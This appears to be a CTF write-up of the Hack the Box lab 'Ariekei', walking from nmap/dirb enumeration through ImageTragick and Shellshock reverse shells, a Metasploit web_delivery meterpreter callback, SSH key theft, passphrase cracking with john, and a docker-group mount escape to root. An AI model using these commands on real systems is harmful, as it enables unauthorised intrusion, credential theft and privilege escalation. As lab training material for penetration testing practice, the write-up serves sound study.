@@ -1,0 +1,361 @@
+
+								
+																		Hack the Box Challenge: Ariekei Walkthrough
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on July 22, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Today we are going to solve another CTF challenge “Ariekei” which is available online for those who want to increase their skill in penetration testing and black box testing. Ariekei is a retired vulnerable lab presented by Hack the Box for making online penetration practices according to your experience level; they have the collection of vulnerable labs as challenges from beginners to Expert level.
+Level: Expert
+Task: find user.txt and root.txt file on the victim’s machine.
+Since these labs are online available therefore they have static IP and IP of sense is 10.10.10.65 so let’s begin with nmap port enumeration.
+
+		
+		
+			
+			
+			
+			
+nmap -sV -p- 10.10.10.65 --open
+			
+				
+					
+				
+					1
+				
+						nmap -sV -p- 10.10.10.65 --open
+					
+				
+			
+		
+
+From the given below image, you can observe we found port 22, 443 and 1022 are open on the target system.
+
+As port 443 is running HTTP server we open the target machine’s IP address in our browser, we check the SSL certificate and find 2 domain names: calvin.ariekei.htb and beehive.ariekei.htb.
+
+Now when we open the website we get a webpage that has a message on it saying it was maintenance.
+
+Now we add the two domain names we found in the SSL certificate in the /etc/hosts file for further enumeration.
+
+When we open “calvin.ariekei.htb” we get an error message saying the requested URL is not found.
+
+Now when we open “beehive.ariekei.htb” we get the same under maintenance page as we did the first time we opened the target’s IP address in our browser.
+
+Now we use dirb to enumerate the directories running on target nginx server. We also find that using either the IP address or the domain “beehive.arieki.htb” gives us identical results.
+
+		
+		
+			
+			
+			
+			
+dirb https://10.10.10.65/ -w
+			
+				
+					
+				
+					1
+				
+						dirb https://10.10.10.65/ -w
+					
+				
+			
+		
+
+
+The dirb scan shows that we access the /cgi-bin/stats directory on the target server, so we open the link provided by the dirb scan. We find that it is running some shell script which might be vulnerable to shellshock vulnerability.
+
+When we try to exploit this page using shellshock, we get an emoji which persists whenever we try to exploit it. This may mean there is a web application firewall that protects the server from this attack.
+
+Now we use dirb to scan the other domain on the target server as it was showing different pages when we opened it in our browser.
+
+		
+		
+			
+			
+			
+			
+dirb https://calvin.ariekei.htb/
+			
+				
+					
+				
+					1
+				
+						dirb https://calvin.ariekei.htb/
+					
+				
+			
+		
+
+
+Dirb scan shows us a directory named “upload/”, we open the link and find an upload page.
+
+This page looks like it converts one type of image into another. This application is may be vulnerable to ImageTragick vulnerability. So we create the mvg file to exploit this vulnerability.
+
+Now we upload the file on the server using the image-convert web application page we find in the upload/ directory.
+
+We setup our listener using netcat, as soon as we upload the file we get our reverse shell.
+
+We take a look at /proc/1/cgroup and find that we are inside a Docker container.
+
+Now we take a look at the mounted files and find a directory called /common.
+
+We open the “common/” directory and find a secret directory called “.secrets/”. We take a look inside the content of the directory and find files named “bastion_key” and “bastion_key.pub”.
+
+We open the “bastion_key” file and we find the RSA key.
+
+We copy the file into our system and save it as id_rsa, so that we can use it to log in using ssh.
+
+We change the permissions of the key, and log in through ssh as root user using the RSA key.
+
+		
+		
+			
+			
+			
+			
+chmod 600 id_rsa
+ssh root@10.10.10.65 -p 1022 -i id_rsa
+			
+				
+					
+				
+					12
+				
+						chmod 600 id_rsassh root@10.10.10.65 -p 1022 -i id_rsa
+					
+				
+			
+		
+
+
+We again check if we are in docker container or not. We check the /proc/1/cgroup file and find that we are still in a docker container.
+
+We again go to the “common/” directory, inside /containers/blog-test/ we find a few files and directories. One of the files contained a few bash commands and also root user password.
+
+Enumerating the rest of the directories, inside /common/containers/waf-live/ we find the configuration files for the nginx server.
+
+We look at the “nginx.conf” file and find that waf-live is running on port 443 and routing all traffic between the blog-test container and us. We also find that mod security is acting as the web application firewall.
+Now during our dirb scan, we found a directory called /cgi-bin/stats/ which could be vulnerable to shellshock but we were unable to exploit it because of the web application firewall. As the waf-live is routing traffic between us and blog-test on port 443 it is possible to exploit the Shellshock vulnerability from inside the server.
+
+We know the target ip to be 172.24.0.2 form the configuration file. We now need to find the IP address to the docker system we are in.
+
+We use the shellshock exploit from here, and we got a reverse shell of the machine.
+
+		
+		
+			
+			
+			
+			
+&lt;span style="color: #000000;"&gt;python 34900.py payload=reverse rhost=172.24.0.2 lhost=172.24.0.253 lport=1234 pages=/cgi-bin/stats&lt;/span&gt;
+			
+				
+					
+				
+					1
+				
+						&lt;span style="color: #000000;"&gt;python 34900.py payload=reverse rhost=172.24.0.2 lhost=172.24.0.253 lport=1234 pages=/cgi-bin/stats&lt;/span&gt;
+					
+				
+			
+		
+
+
+The shell we got was not stable, so we use the web_delivery module of the Metasploit-framework to get a stable reverse shell.
+
+		
+		
+			
+			
+			
+			
+msf &gt; use multi/script/web_delivery
+msf exploit(multi/script/web_delivery) &gt; set payload python/meterpreter/reverse_tcp
+msf exploit(multi/script/web_delivery) &gt; set lhost 10.10.14.8
+msf exploit(multi/script/web_delivery) &gt; set lport 4444
+msf exploit(multi/script/web_delivery) &gt; run
+			
+				
+					
+				
+					12345
+				
+						msf &gt; use multi/script/web_deliverymsf exploit(multi/script/web_delivery) &gt; set payload python/meterpreter/reverse_tcpmsf exploit(multi/script/web_delivery) &gt; set lhost 10.10.14.8msf exploit(multi/script/web_delivery) &gt; set lport 4444msf exploit(multi/script/web_delivery) &gt; run
+					
+				
+			
+		
+
+
+We copy the command that was given in by the web_delivery script and pasted it in our unstable shell and we got our stable reverse shell.
+
+Now we spawn a TTY shell and use the password we found earlier in the Dockerfile to log in as root.
+
+Unfortunately, we are still inside a container app but in this container, inside /home/spanishdancer we find a file called “user.txt”. We take a look at the content of the file and find our first flag.
+
+We search for hidden directories and find a directory called “.ssh” we go inside the directory and find three files authorized_keys, id_rsa and id_rsa.pub.
+
+We take a look at the content of id_rsa and find the RSA key.
+
+We copy the RSA key into our system and save it as key.txt so that we can use this to log in through ssh.
+
+When we try to login through ssh using this key, we are asked for a passphrase. So we use john the ripper to crack the passphrase. We use the default wordlist of johntheripper and find the passphrase to be “purple1”.
+
+		
+		
+			
+			
+			
+			
+ssh2john key.txt &gt; hash_key.txt
+john hash_key.txt
+			
+				
+					
+				
+					12
+				
+						ssh2john key.txt &gt; hash_key.txtjohn hash_key.txt
+					
+				
+			
+		
+
+
+After we get the passphrase we change the permission of RSA key file and login as user spanishdancer as it was inside the spanishdancer’s home directory.
+
+		
+		
+			
+			
+			
+			
+chmod 600 key.txt
+ssh -i key.txt spanishdancer@10.10.10.65
+			
+				
+					
+				
+					12
+				
+						chmod 600 key.txtssh -i key.txt spanishdancer@10.10.10.65
+					
+				
+			
+		
+
+
+Now when we run the id command we find that we are a member of the docker group. Some containers have a dedicated group to allow unprivileged users to manage their containers without having to escalate their privileges.
+
+To exploit this vulnerability, we first need to check the docker images that are available.
+docker images
+
+We find that the bash image is available to us, so we use this to create a new image and mount the root/ directory of the host inside a folder called /hack. After we run the docker image we go to /hack/root and find a file called “root.txt”. When we open the file we find our final flag.
+
+		
+		
+			
+			
+			
+			
+docker run -v /:/hack -i -t bash
+			
+				
+					
+				
+					1
+				
+						docker run -v /:/hack -i -t bash
+					
+				
+			
+		
+
+
+Author: Sayantan Bera is a technical writer at hacking articles and cybersecurity enthusiast. Contact Here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
